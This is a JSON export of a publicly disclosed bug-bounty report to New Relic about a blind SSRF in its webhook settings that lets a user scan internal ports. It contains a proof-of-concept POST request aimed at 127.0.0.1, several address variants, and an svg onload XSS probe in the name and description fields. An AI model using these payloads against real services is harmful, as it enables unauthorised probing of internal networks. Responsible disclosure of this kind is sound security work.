{"id":263169,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjMxNjk=","url":"https://hackerone.com/reports/263169","title":"Internal Ports Scanning via Blind SSRF","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-08-25T09:10:34.562Z","submitted_at":"2017-08-25T09:10:34.562Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tungpun","url":"/tungpun","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-10-11T13:08:21.562Z","bug_reporter_agreed_on_going_public_at":"2017-09-11T13:08:15.251Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Introduction:\n\nI found a Blind SSRF issue that allows scanning internal ports.\n\n## How to reproduce:\n\n* Go to \n`https://rpm.newrelic.com/accounts/\u003cacc_id\u003e/notification_channels?type=WebhookIntegration`\n{F215718}\n\n* Fill the input. In the web hook URL section, fill: `http://\u003cinternal_hostname\u003e:\u003cport\u003e/`.\n\n* Send the request.\n\nLook up the response. If valid, it will return status code 200, or 422 for otherwise.\nFor demonstration, I try scanning the `localhost` with a limited port range, then found an available port `4352`.\n\nAnd here is the PoC:\n\n```\nPOST /accounts/1723471/notification_channels?type=WebhookIntegration HTTP/1.1\n\nutf8=%E2%9C%93\u0026authenticity_token=i%2FxIU01NWUoCx92w1%2FmilEwulU1SjUGSKsJR8ARB4CQ%3D\u0026webhook_integration%5Bname%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E\u0026webhook_integration%5Bwebhook_url%5D=http://127.0.0.1:4352/\u0026webhook_integration%5Bdescription%5D=%22%3E%3Csvg%2Fonload%3Dalert(3)%3B%3E\u0026webhook_integration%5Bverbosity%5D=default\u0026webhook_integration%5Benabled%5D=true\n```\n\nAs the filter does not validate the input, it allows the attacker to make the GET request to the internal network.\nI tried replacing `http://127.0.0.1:4352/` by `http://0:4352/` and `http://127.0.0.1:4352/?test=aaaaaaa`, it still works.\n\nIn conclusion, I think internal addresses should not be allowed.","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":215718,"file_name":"Screen_Shot_2017-08-25_at_4.47.15_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/215/718/b4f29254b018958e24b4803474f62142fab025b6/Screen_Shot_2017-08-25_at_4.47.15_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-08-25_at_4.47.15_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-08-25_at_4.47.15_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ33OZT5PP%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T143304Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDh91HQqgz8mt29LtWDknUFVa4Bu86qeWnq8qOBQ4%2B8YAIhAJicmQmdRKuH%2BFKshKD5HTFqxieLS9bLt%2Bm8ixoUQIW3KoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxjBiCZo4VtYu6s0mkq1wMS3NiFshNMAkLirys6UqWqG8DtyLSnjp2Jjq3FOYZ3z5QPGI3pyApw22mHN9%2FCuJJ7nvZBlTnqVZioeymrRwRkh3Ep2Grp7bfy17tsucRab4%2Fwcov%2FuB%2BH%2FlOKLA0dPOLvtzKyIZukVE4weTfh0vOmJyKq0MNT872S%2BEJQLaNHxuaApYj89CoiKQ8iIYPil%2Fer515Tq61zraK163aXC6Wy%2Bh9wZG9n9nO%2BF1HjHbOKQzNHLtEPDs0LaRFl2yyG012UrzxbWRh3SKf%2BZrF4YZHuHGoHHIILeGK7ULsTEUwPzgUchRw1iPy0mN9FOZAmWbrDJGsit0hVq3pp5X2hPUG4sFE8%2F6L9i0WnB%2B10Vp3U%2Frt684dQjLB%2BN9XMGfru4gI4tqqTswEvdVKIEl24vu1y1GF4NHtB52g2uU0a32AMPT4CyiEmO89SmREN7kkSkG506ZPZM6WpVb3X01QplYYRrO8hlLoLzsG90yPauXyc9z1g3ctobA3rwzP0%2BqnbTFOPOLdg%2Fez87Kn7dOH%2FJ5gT4VcfvDJKUt7spf4PMSNNs%2B45MGrcVDhtPaqpVkGpjTY2Qumd8jnWYmah%2BcSUkcSfYxIQ8VjPNpkeGcsLaLhPLK%2BhKhc6iXUw9vqQiwY6pAEkpudJjvKBj1n%2B2NK2uzTbiu0zjrqvjRC7B2s5rDWkChSlyjdb5Gs7Y4xGynRFg2owPJvc66mub6OLgiEzz%2BMOYFcjvSwIHpDD0Esy3kPtVCPpCMvheYuZFtLkLN%2FOortUj7F7jaVVdakEud32Wsg33glLfI0B%2F55RSf0DkRble%2FhL0EB4lzVO1F1OLS0MQQYssZKljr4UYXvI8G5j0rwW6dHIGQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=5824f9a699b0f16ca3c19f89938ef97ff4f83cfd3f08c93bd6474e64756a0012","file_size":157740,"type":"image/png"}],"allow_singular_disclosure_at":"2017-10-11T13:08:15.280Z","allow_singular_disclosure_after":-126235488.93969162,"singular_disclosure_allowed":true,"vote_count":13,"voters":["sp1d3rs","eveeez","r3y","malcolmx","m16","arifmkhls","alfredsaonoy","zerotoone","japz","sumit7","and 3 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1953963,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2017-08-25T09:10:49.071Z","updated_at":"2017-08-25T09:10:49.071Z","additional_data":{"old_title":"Internal Port Scanning via Blind SSRF","new_title":"Internal Ports Scanning via Blind SSRF"},"actor":{"username":"tungpun","cleared":true,"url":"/tungpun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1956056,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report! This is a great find â€“ I have reproduced the issue, and triaged it with the appropriate engineering team. We will keep you updated on its remediation progress!\n\nAs a token of our thanks, you can follow this link to choose a size and shipping address for a New Relic t-shirt! Thank you so much for helping keep New Relic secure. http://get.printfection.com/ztwfh/4974674756/jkkfbknhhy","automated_response":false,"created_at":"2017-08-25T22:04:15.087Z","updated_at":"2017-08-25T22:04:15.087Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1956324,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the swag. Hope you will fix this issue soon.","automated_response":false,"created_at":"2017-08-26T02:42:05.033Z","updated_at":"2017-08-26T02:42:05.033Z","actor":{"username":"tungpun","cleared":true,"url":"/tungpun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1988925,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We believe this issue to be resolved. Thanks very much for reporting it to us, we really appreciate your help keeping New Relic and its customers secure!","automated_response":false,"created_at":"2017-09-11T13:02:22.373Z","updated_at":"2017-09-11T13:02:22.373Z","actor":{"username":"ahamlin","cleared":false,"url":"/ahamlin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/071/b10c1e5872fac616ba0f3b67bb1e6e06ba70fe6c_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"tungpun","url":"/tungpun"},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1988953,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great to hear that this case has been fixed. Could we disclosure ?","automated_response":false,"created_at":"2017-09-11T13:07:46.074Z","updated_at":"2017-09-11T13:07:46.074Z","actor":{"username":"tungpun","cleared":true,"url":"/tungpun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1988956,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-09-11T13:08:15.267Z","updated_at":"2017-09-11T13:08:15.267Z","first_to_agree":true,"actor":{"username":"tungpun","cleared":true,"url":"/tungpun","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/643/53db3c3da091000ce826787b75855f65371bc517_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2058744,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-10-11T13:08:21.599Z","updated_at":"2017-10-11T13:08:21.599Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2694291,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2018-05-03T03:35:10.615Z","updated_at":"2018-05-03T03:35:10.615Z","actor":{"url":"/newrelic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"New Relic"}},"genius_execution_id":null,"team_handle":"newrelic","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}